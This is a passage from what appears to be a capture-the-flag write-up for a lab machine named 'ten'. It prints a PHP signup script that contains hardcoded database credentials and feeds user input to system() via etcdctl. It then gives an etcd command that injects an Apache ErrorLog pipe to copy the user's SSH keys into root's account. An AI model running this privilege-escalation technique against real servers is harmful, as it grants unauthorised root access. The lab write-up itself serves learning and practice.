Beacause of the php misconfig file ,so we can input the `/srv/ten-9a28ba33/`

### 3. php source code review

```shell
tyrell@ten:/var/www/html$ ls
attribution.php  dist                                                images.txt  index.php  signup.php
carousel.css     get-credentials-please-do-not-spam-this-thanks.php  index.html  info.php
```

**The Web Filter Bypass:** The PHP script `get-credentials-please-do-not-spam-this-thanks.php` tries to sanitize the domain input using a regex (`preg_match('/^[0-9a-z]+$/'`) before passing it to the `system()` function. However, since you already have an SSH shell as the user `tyrell`, you can bypass the web interface entirely and interact directly with `etcd` using the `etcdctl` command line tool.

```
tyrell@ten:/var/www/html$ cat get-credentials-please-do-not-spam-this-thanks.php
<?php
if ( !isset($_POST['domain']) ) {
  header('Location: /signup.php');
}
if(!preg_match('/^[0-9a-z]+$/', $_POST['domain'])) {
  echo('<font color=red>Domain name can only contain alphanumeric characters.</font>');
} else {
  $username = "ten-" . substr(hash("md5",rand()),0,8);
  $password = substr(hash("md5",rand()),0,8);
  $password_crypt = crypt($password,'$1$OWNhNDE');
  sleep(10); // This is only here so that you do not create too many users :)
  $mysqli = new mysqli("127.0.0.1", "user", "pa55w0rd", "pureftpd");
  $stmt = $mysqli->prepare("INSERT INTO users VALUES ( NULL, ?, ?, ?, ?, ? );");
  $uid = random_int(2000,65535);
  $dir = "/srv/$username/./";
  $stmt->bind_param('ssiis',$username,$password_crypt,$uid,$uid,$dir);
  $stmt->execute();
  system("ETCDCTL_API=3 /usr/bin/etcdctl put /customers/$username/url " . $_POST['domain']);
  echo('<p class="lead">Your personal account is ready to be used:<br><br>Username: <b>'.$username.'</b><br>Password: <b>'.$password.'</b><br>Personal Domain: <b>'.$_POST['domain'].'.ten.vl</b><br><br>You can use the provided credentials to upload your pages<br> via ftp://ten.vl.<br><br><font size="-1">It may take up to one minute for all backend processes to properly identify you as well as your personal virtual host to be available.</font></p>');
}

```

### 4 Exploit code

* change the ten-b1d97c7a to you username
* change the fix.ten.vl to your generate domain

```
ETCDCTL_API=3 /usr/bin/etcdctl put /customers/ten-b1d97c7a/url 'fix.ten.vl
ErrorLog "|/usr/bin/cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys"
#'
OK

```
